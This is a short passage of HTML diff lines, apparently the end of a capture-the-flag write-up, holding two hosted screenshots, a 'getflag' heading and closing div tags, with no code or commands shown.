+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181107145102-7d8a8f4c-e259-1.png"/></p>
+<h4 data-content="1" id="f3c92e30dfabf265fe93bdd2ceec9de6">getflag</h4>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181107145102-7da678ce-e259-1.png"/></p>
+</div>
+</div>
